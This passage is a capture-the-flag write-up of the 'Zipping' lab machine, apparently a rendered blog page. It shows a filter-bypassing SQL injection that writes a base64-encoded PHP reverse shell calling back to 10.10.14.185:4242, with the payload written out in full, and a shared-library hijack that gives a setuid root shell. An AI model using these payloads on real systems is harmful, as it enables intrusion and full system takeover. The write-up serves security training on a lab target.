+Type<span class="w"> </span><span class="s1">&#39;help;&#39;</span><span class="w"> </span>or<span class="w"> </span><span class="s1">&#39;\h&#39;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>help.<span class="w"> </span>Type<span class="w"> </span><span class="s1">&#39;\c&#39;</span><span class="w"> </span>to<span class="w"> </span>clear<span class="w"> </span>the<span class="w"> </span>current<span class="w"> </span>input<span class="w"> </span>statement.
+
+MySQL<span class="w"> </span><span class="o">[</span>zipping<span class="o">]</span>&gt;<span class="w"> </span>create<span class="w"> </span>table<span class="w"> </span>products<span class="o">(</span>
+<span class="w">    </span>-&gt;<span class="w"> </span>id<span class="w"> </span>varchar<span class="o">(</span><span class="m">50</span><span class="o">)</span>,
+<span class="w">    </span>-&gt;<span class="w"> </span>name<span class="w"> </span>varchar<span class="o">(</span><span class="m">50</span><span class="o">)</span>,
+<span class="w">    </span>-&gt;<span class="w"> </span>date_added<span class="w"> </span>varchar<span class="o">(</span><span class="m">50</span><span class="o">)</span>,
+<span class="w">    </span>-&gt;<span class="w"> </span>img<span class="w"> </span>varchar<span class="o">(</span><span class="m">50</span><span class="o">)</span>,
+<span class="w">    </span>-&gt;<span class="w"> </span>price<span class="w"> </span>varchar<span class="o">(</span><span class="m">50</span><span class="o">)</span>,
+<span class="w">    </span>-&gt;<span class="w"> </span>rrp<span class="w"> </span>varchar<span class="o">(</span><span class="m">50</span><span class="o">)</span>
+<span class="w">    </span>-&gt;<span class="w"> </span><span class="o">)</span><span class="p">;</span>
+Query<span class="w"> </span>OK,<span class="w"> </span><span class="m">0</span><span class="w"> </span>rows<span class="w"> </span>affected<span class="w"> </span><span class="o">(</span><span class="m">0</span>.059<span class="w"> </span>sec<span class="o">)</span>
+
+MySQL<span class="w"> </span><span class="o">[</span>zipping<span class="o">]</span>&gt;<span class="w"> </span>insert<span class="w"> </span>into<span class="w"> </span>products<span class="w"> </span>values<span class="o">(</span><span class="m">1</span>,<span class="s1">&#39;thing&#39;</span>,<span class="s1">&#39;05/11/2023&#39;</span>,<span class="w"> </span><span class="s1">&#39;&#39;</span>,<span class="w"> </span><span class="s1">&#39;&#39;</span>,<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="o">)</span><span class="p">;</span>
+Query<span class="w"> </span>OK,<span class="w"> </span><span class="m">1</span><span class="w"> </span>row<span class="w"> </span>affected<span class="w"> </span><span class="o">(</span><span class="m">0</span>.012<span class="w"> </span>sec<span class="o">)</span>
+
+MySQL<span class="w"> </span><span class="o">[</span>zipping<span class="o">]</span>&gt;<span class="w"> </span><span class="k">select</span><span class="w"> </span>*<span class="w"> </span>from<span class="w"> </span>products<span class="p">;</span>
++------+-------+------------+------+-------+------+
+<span class="p">|</span><span class="w"> </span>id<span class="w">   </span><span class="p">|</span><span class="w"> </span>name<span class="w">  </span><span class="p">|</span><span class="w"> </span>date_added<span class="w"> </span><span class="p">|</span><span class="w"> </span>img<span class="w">  </span><span class="p">|</span><span class="w"> </span>price<span class="w"> </span><span class="p">|</span><span class="w"> </span>rrp<span class="w">  </span><span class="p">|</span>
++------+-------+------------+------+-------+------+
+<span class="p">|</span><span class="w"> </span><span class="m">1</span><span class="w">    </span><span class="p">|</span><span class="w"> </span>thing<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="m">05</span>/11/2023<span class="w"> </span><span class="p">|</span><span class="w">      </span><span class="p">|</span><span class="w">       </span><span class="p">|</span><span class="w">      </span><span class="p">|</span>
++------+-------+------------+------+-------+------+
+<span class="m">1</span><span class="w"> </span>row<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span><span class="o">(</span><span class="m">0</span>.002<span class="w"> </span>sec<span class="o">)</span>
+
+MySQL<span class="w"> </span><span class="o">[</span>zipping<span class="o">]</span>&gt;
+</pre></div>
+</div>
+<p>And now we have working local vesion of the site to play</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>php<span class="w"> </span>-S<span class="w"> </span>localhost:8080<span class="w"> </span>-f<span class="w"> </span>index.php
+<span class="o">[</span>Sun<span class="w"> </span>Nov<span class="w">  </span><span class="m">5</span><span class="w"> </span><span class="m">17</span>:48:20<span class="w"> </span><span class="m">2023</span><span class="o">]</span><span class="w"> </span>PHP<span class="w"> </span><span class="m">8</span>.2.12<span class="w"> </span>Development<span class="w"> </span>Server<span class="w"> </span><span class="o">(</span>http://localhost:8080<span class="o">)</span><span class="w"> </span>started
+<span class="o">[</span>Sun<span class="w"> </span>Nov<span class="w">  </span><span class="m">5</span><span class="w"> </span><span class="m">17</span>:48:23<span class="w"> </span><span class="m">2023</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>::1<span class="o">]</span>:34620<span class="w"> </span>Accepted
+<span class="o">[</span>Sun<span class="w"> </span>Nov<span class="w">  </span><span class="m">5</span><span class="w"> </span><span class="m">17</span>:48:23<span class="w"> </span><span class="m">2023</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>::1<span class="o">]</span>:34620<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>:<span class="w"> </span>GET<span class="w"> </span>/index.php
+<span class="o">[</span>Sun<span class="w"> </span>Nov<span class="w">  </span><span class="m">5</span><span class="w"> </span><span class="m">17</span>:48:23<span class="w"> </span><span class="m">2023</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>::1<span class="o">]</span>:34620<span class="w"> </span>Closing
+</pre></div>
+</div>
+<p>This is what we wanna achieve, but executed on our local setup, note that the outfile path isn’t exatly the same:</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="n">MySQL</span><span class="w"> </span><span class="p">[</span><span class="n">zipping</span><span class="p">]</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="n">from_base64</span><span class="p">(</span><span class="s1">&#39;cHJvZHVjdHM=&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">outfile</span><span class="w"> </span><span class="s1">&#39;/var/lib/mysql-files/shell.php&#39;</span><span class="p">;</span>
+<span class="n">ERROR</span><span class="w"> </span><span class="mi">1064</span><span class="w"> </span><span class="p">(</span><span class="mi">42000</span><span class="p">):</span><span class="w"> </span><span class="n">You</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">error</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="k">SQL</span><span class="w"> </span><span class="n">syntax</span><span class="p">;</span><span class="w"> </span><span class="k">check</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">manual</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">corresponds</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="k">version</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">right</span><span class="w"> </span><span class="n">syntax</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">near</span><span class="w"> </span><span class="s1">&#39;%0A&#39;</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">line</span><span class="w"> </span><span class="mi">1</span>
+<span class="n">Query</span><span class="w"> </span><span class="n">OK</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">row</span><span class="w"> </span><span class="n">affected</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">002</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bash-4.4#<span class="w"> </span>cat<span class="w"> </span>shell.php
+products
+</pre></div>
+</div>
+<p>Preparing a shell</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>shell.sh
+bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/10.10.14.185/4242<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>shell.sh<span class="p">|</span>base64<span class="p">|</span>pbcopy
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>shell.php
+&lt;?php<span class="w"> </span>exec<span class="o">(</span><span class="s2">&quot;printf YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODUvNDI0MiAwPiYxCg== | base64 -d | bash&quot;</span><span class="o">)</span><span class="p">;</span><span class="w"> </span>?&gt;
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>shell.php<span class="p">|</span>base64<span class="w"> </span>-w0<span class="p">|</span>pbcopy
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>PD9waHAgZXhlYygicHJpbnRmIFltRnphQ0F0YVNBK0ppQXZaR1YyTDNSamNDOHhNQzR4TUM0eE5DNHhPRFV2TkRJME1pQXdQaVl4Q2c9PSB8IGJhc2U2NCAtZCB8IGJhc2giKTsgPz4K
+</pre></div>
+</div>
+<p>The newline character isn’t part of the preg filter, so we should be able to use this to bypass the filter altogether, then use from_base64 to bring our reverse shell, and into outfile to write into /var/li/mysql since this is running as root</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>%0A&#39;;select from_base64(&#39;PD9waHAgZXhlYygicHJpbnRmIFltRnphQ0F0YVNBK0ppQXZaR1YyTDNSamNDOHhNQzR4TUM0eE5DNHhPRFV2TkRJME1pQXdQaVl4Q2c9PSB8IGJhc2U2NCAtZCB8IGJhc2giKTsgPz4K&#39;) into outfile &#39;/var/lib/mysql/shell.php&#39;; --1
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>%0A&#39;%3bselect+from_base64(&#39;PD9waHAgZXhlYygicHJpbnRmIFltRnphQ0F0YVNBK0ppQXZaR1YyTDNSamNDOHhNQzR4TUM0eE5DNHhPRFV2TkRJME1pQXdQaVl4Q2c9PSB8IGJhc2U2NCAtZCB8IGJhc2giKTsgPz4K&#39;)+into+outfile+&#39;/var/lib/mysql/shell.php&#39;%3b+--1
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>quantity=1&amp;product_id=%0A&#39;%3bselect+from_base64(&#39;PD9waHAgZXhlYygicHJpbnRmIFltRnphQ0F0YVNBK0ppQXZaR1YyTDNSamNDOHhNQzR4TUM0eE5DNHhPRFV2TkRJME1pQXdQaVl4Q2c9PSB8IGJhc2U2NCAtZCB8IGJhc2giKTsgPz4K&#39;)+into+outfile+&#39;/var/lib/mysql/shell.php&#39;%3b+--1
+</pre></div>
+</div>
+<p>And finally we can just use this to execute the php reverse shell with a get</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>xdg-open<span class="w"> </span><span class="s1">&#39;http://10.10.11.229/shop/index.php?page=/var/lib/mysql/shell&#39;</span>
+</pre></div>
+</div>
+</section>
+<section id="privesc">
+<h2>Privesc<a class="headerlink" href="#privesc" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>rektsu@zipping:~$<span class="w"> </span>sudo<span class="w"> </span>-l
+Matching<span class="w"> </span>Defaults<span class="w"> </span>entries<span class="w"> </span><span class="k">for</span><span class="w"> </span>rektsu<span class="w"> </span>on<span class="w"> </span>zipping:
+<span class="w">    </span>env_reset,<span class="w"> </span>mail_badpass,<span class="w"> </span><span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User<span class="w"> </span>rektsu<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>zipping:
+<span class="w">    </span><span class="o">(</span>ALL<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>/usr/bin/stock
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>file<span class="w"> </span>/usr/bin/stock
+/usr/bin/stock:<span class="w"> </span>ELF<span class="w"> </span><span class="m">64</span>-bit<span class="w"> </span>LSB<span class="w"> </span>pie<span class="w"> </span>executable,<span class="w"> </span>x86-64,<span class="w"> </span>version<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>SYSV<span class="o">)</span>,<span class="w"> </span>dynamically<span class="w"> </span>linked,<span class="w"> </span>interpreter<span class="w"> </span>/lib64/ld-linux-x86-64.so.2,<span class="w"> </span>BuildID<span class="o">[</span>sha1<span class="o">]=</span>aa34d8030176fe286f8011c9d4470714d188ab42,<span class="w"> </span><span class="k">for</span><span class="w"> </span>GNU/Linux<span class="w"> </span><span class="m">3</span>.2.0,<span class="w"> </span>not<span class="w"> </span>stripped
+</pre></div>
+</div>
+<p>There is no netcat on this box but the binary is very small so I just exfiltrated in base64 form through the clipboard, then a quick look at it through strings gives us the password since it is hardcoded in the binary:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>strings<span class="w"> </span>stock<span class="p">|</span>grep<span class="w"> </span>pass<span class="w"> </span>-B4<span class="w"> </span>-A4
+u+UH
+Hakaize
+S***********
+/root/.stock.csv
+Enter<span class="w"> </span>the<span class="w"> </span>password:
+Invalid<span class="w"> </span>password,<span class="w"> </span>please<span class="w"> </span>try<span class="w"> </span>again.
+<span class="o">==================</span><span class="w"> </span><span class="nv">Menu</span><span class="w"> </span><span class="o">==================</span>
+<span class="m">1</span><span class="o">)</span><span class="w"> </span>See<span class="w"> </span>the<span class="w"> </span>stock
+<span class="m">2</span><span class="o">)</span><span class="w"> </span>Edit<span class="w"> </span>the<span class="w"> </span>stock
+<span class="m">3</span><span class="o">)</span><span class="w"> </span>Exit<span class="w"> </span>the<span class="w"> </span>program
+</pre></div>
+</div>
+<p>Running strace against it we can see that it attempts to load a shared library in rektsu’s home which doesn’t exist</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>openat<span class="o">(</span>AT_FDCWD,<span class="w"> </span><span class="s2">&quot;/home/rektsu/.config/libcounter.so&quot;</span>,<span class="w"> </span>O_RDONLY<span class="p">|</span>O_CLOEXEC<span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">3</span>
+</pre></div>
+</div>
+<p>So we can write one that spawns a shell</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>rektsu@zipping:/tmp$<span class="w"> </span>nano<span class="w"> </span>libcounter.c
+</pre></div>
+</div>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+
+<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">inject</span><span class="p">()</span><span class="w"> </span><span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">));</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">inject</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w"> </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>rektsu@zipping:/tmp$<span class="w"> </span>gcc<span class="w"> </span>-c<span class="w"> </span>-o<span class="w"> </span>libcounter.o<span class="w"> </span>libcounter.c
+rektsu@zipping:/tmp$<span class="w"> </span>gcc<span class="w"> </span>-shared<span class="w"> </span>-o<span class="w"> </span>libcounter.so<span class="w"> </span>libcounter.o
+rektsu@zipping:/tmp$<span class="w"> </span>ls<span class="w"> </span>-lart<span class="w"> </span>libcounter*
+-rw-rw-r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>rektsu<span class="w"> </span>rektsu<span class="w">   </span><span class="m">183</span><span class="w"> </span>Nov<span class="w">  </span><span class="m">5</span><span class="w"> </span><span class="m">19</span>:24<span class="w"> </span>libcounter.c
+-rw-rw-r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>rektsu<span class="w"> </span>rektsu<span class="w">  </span><span class="m">1728</span><span class="w"> </span>Nov<span class="w">  </span><span class="m">5</span><span class="w"> </span><span class="m">19</span>:32<span class="w"> </span>libcounter.o
+-rwxrwxr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>rektsu<span class="w"> </span>rektsu<span class="w"> </span><span class="m">15544</span><span class="w"> </span>Nov<span class="w">  </span><span class="m">5</span><span class="w"> </span><span class="m">19</span>:32<span class="w"> </span>libcounter.so
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>rektsu@zipping:/tmp$<span class="w"> </span>cp<span class="w"> </span>libcounter.so<span class="w"> </span>~/.config/libcounter.so
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>rektsu@zipping:~/.config$<span class="w"> </span>sudo<span class="w"> </span>stock
+Enter<span class="w"> </span>the<span class="w"> </span>password:<span class="w"> </span>S***********
+root@zipping:/home/rektsu/.config#<span class="w"> </span>id
+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
+root@zipping:/home/rektsu/.config#
+</pre></div>
+</div>
+<p>And we’re root</p>
+</section>
+</section>
+
+        </article>
+      </div>
+      <footer>
+        
+        <div class="related-pages">
+          <a class="next-page" href="../../easy/easy.html">
+              <div class="page-info">
+                <div class="context">
+                  <span>Next</span>
+                </div>
+                <div class="title">Easy</div>
+              </div>
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+            </a>
+          <a class="prev-page" href="../updown/updown.html">
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+              <div class="page-info">
+                <div class="context">
+                  <span>Previous</span>
+                </div>
+                
+                <div class="title">Updown</div>
+                
+              </div>
+            </a>
+        </div>
+        <div class="bottom-of-page">
+          <div class="left-details">
+            <div class="copyright">
+                Copyright &#169; 2023, blnkn
+            </div>
+            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
+            
+            <a href="https://github.com/pradyunsg/furo">Furo</a>
+            
+          </div>
+          <div class="right-details">
+            
+          </div>
+        </div>
+        
+      </footer>
+    </div>
+    <aside class="toc-drawer">
+      
+      
+      <div class="toc-sticky toc-scroll">
+        <div class="toc-title-container">
+          <span class="toc-title">
+            On this page
+          </span>
+        </div>
+        <div class="toc-tree-container">
+          <div class="toc-tree">
+            <ul>
+<li><a class="reference internal" href="#">Zipping</a><ul>
+<li><a class="reference internal" href="#enum">Enum</a></li>
+<li><a class="reference internal" href="#arbitrary-file-read">Arbitrary file read</a></li>
+<li><a class="reference internal" href="#automating-the-process">Automating the process</a></li>
+<li><a class="reference internal" href="#sql-injection">SQL injection</a></li>
+<li><a class="reference internal" href="#privesc">Privesc</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      </div>
+      
+      
+    </aside>
+  </div>
+</div><script data-url_root="../../../../" id="documentation_options" src="../../../../_static/documentation_options.js?v=b3ba4146"></script>
+    <script src="../../../../_static/doctools.js?v=888ff710"></script>
+    <script src="../../../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../../../_static/scripts/furo.js?v=32e29ea5"></script>
+    </body>
+</html>
